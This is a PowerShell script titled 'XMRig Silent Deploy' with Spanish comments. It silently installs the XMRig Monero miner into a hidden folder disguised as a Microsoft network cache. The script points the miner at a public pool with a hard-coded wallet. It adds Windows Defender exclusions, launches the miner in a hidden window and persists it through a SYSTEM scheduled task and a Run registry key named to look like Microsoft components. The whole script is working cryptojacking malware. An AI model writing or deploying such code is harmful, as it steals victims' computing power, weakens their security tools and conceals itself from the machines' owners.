# XMRig Silent Deploy - FINAL ULTRA FIXED (direct exe + env var native)
$InstallDir = "C:\ProgramData\Microsoft\Network\Cache"
if (-not (Test-Path $InstallDir)) {
    New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    (Get-Item $InstallDir).Attributes += "Hidden"
}

# Limpiar tarea antigua por si acaso
$TaskName = "MicrosoftNetworkCache"
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$ZipPath = "$env:TEMP\xmrig.zip"
Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60 -ErrorAction SilentlyContinue
Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
Remove-Item $ZipPath -Force

$Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
if ($Sub) {
    Move-Item "$($Sub.FullName)\*" $InstallDir -Force
    Remove-Item $Sub.FullName -Recurse -Force
}

$ConfigPath = "$InstallDir\config.json"
$BatPath = "$InstallDir\start.bat"

$ConfigJson = @"
{
  "autosave": false,
  "colors": false,
  "cpu": { "enabled": true, "max-threads-hint": 60 },
  "donate-level": 0,
  "pools": [{
    "algo": "rx/0",
    "url": "pool.supportxmr.com:443",
    "user": "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd",
    "pass": "x",
    "keepalive": true,
    "tls": true,
    "rig-id": "`${COMPUTERNAME}"
  }]
}
"@
[System.IO.File]::WriteAllText($ConfigPath, $ConfigJson, [System.Text.Encoding]::UTF8)

$BatContent = @"
@echo off
cd /d "%~dp0"
xmrig.exe -c config.json -B --no-color
"@
$BatContent | Out-File $BatPath -Encoding ASCII -Force

# Exclusiones Defender
try { Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue } catch {}
try { Add-MpPreference -ExclusionProcess "$InstallDir\xmrig.exe" -ErrorAction SilentlyContinue } catch {}

# Lanzamiento inmediato
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$BatPath`"" -WindowStyle Hidden -WorkingDirectory $InstallDir

# Persistencia (tarea + registry)
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c cd /d `"$InstallDir`" && xmrig.exe -c config.json -B --no-color"
$Trigger = New-ScheduledTaskTrigger -AtStartup
try {
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
} catch {
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
}
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "cmd.exe /c cd /d `"$InstallDir`" && xmrig.exe -c config.json -B --no-color" -Force

# Forzar arranque ahora
schtasks /run /tn $TaskName | Out-Null
